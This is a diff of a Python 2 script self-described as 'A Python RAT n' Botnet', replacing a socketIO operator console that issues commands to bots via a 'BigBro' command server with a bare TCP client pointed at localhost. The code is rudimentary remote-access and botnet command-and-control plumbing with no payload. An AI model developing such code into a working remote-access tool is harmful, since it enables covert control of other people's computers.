@@ -1,45 +1,37 @@
 # A Python RAT n' Botnet
 #  by Landon in Python2
-#   COMMAND-ENTRY C0DE
+#    CLIENT-SIDE C0DE
 
-from socketIO_client import SocketIO
-import re
+import socket
 
-bigBro = raw_input("BigBro Server? >") # Malicious Server IP.
-socket = SocketIO("http://" + bigBro, 1984)
+bigBro = '127.0.0.1' # Malicious Server IP.
 
-# Functions for socket listeners.
-class listeners:
+clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+clientSocket.connect(( bigBro, 8080 )) # To-do: Change port later. 
 
-    def log(*args):
-        print(args[0])
+class commands:
+    def log( output ):
+        print( output )
 
-# These two lines set the listeners.
-for function in listeners.__dict__:
-    socket.on(function, listeners.__dict__[function])
+# password = raw_input("Password? > ") # To-do: Uncomment this later.
 
-# Authenticates the innerParty with the bigbro server.
-socket.emit('authenticate', raw_input("Password? >"))
+recipient = "all"
+turnedOn = True
+while turnedOn:
 
-# This function is used to tokenize Command Line Input.
-def tokenize(string):
-    tokenizeRegex = re.compile( r"([^\w\n]|[\w]+)\s?(.*)" )
-    matches =  tokenizeRegex.match(string)
-    return [matches.group(1), matches.group(2)]
+    sendCommand = raw_input(recipient + "> ")
+    clientSocket.send(recipient + " " + sendCommand)
 
-to = 'all' # By default, send commands to all proles.
-while True:
-    CLI     = tokenize( raw_input(to + " - >") ) # Command line tokens.
-    command = CLI[0]    # The command itself.
-    args    = CLI[1]    # The arguments to the command.
+    message = clientSocket.recv(2048)
 
-    if   command in ['~', 's', 'switch']: # Switch who the command is sent to.
-        to = args
+    if message == "kill": turnedOn = False
 
-    elif command in ['?', 'l', 'listen']: # Listen for emits for a given time.
-        if args == 'forever':   socket.wait()
-        else:                   socket.wait(seconds=int(args))
+    message = message.split(" ", 1)
 
-    else:
-        socket.emit('command', to, command, args)
-        socket.wait(seconds=1)
+    if len(message) == 2:
+        command, arg = message
+
+    if command in commands.__dict__:
+        commands.__dict__[command]( arg )
+
+clientSocket.close()
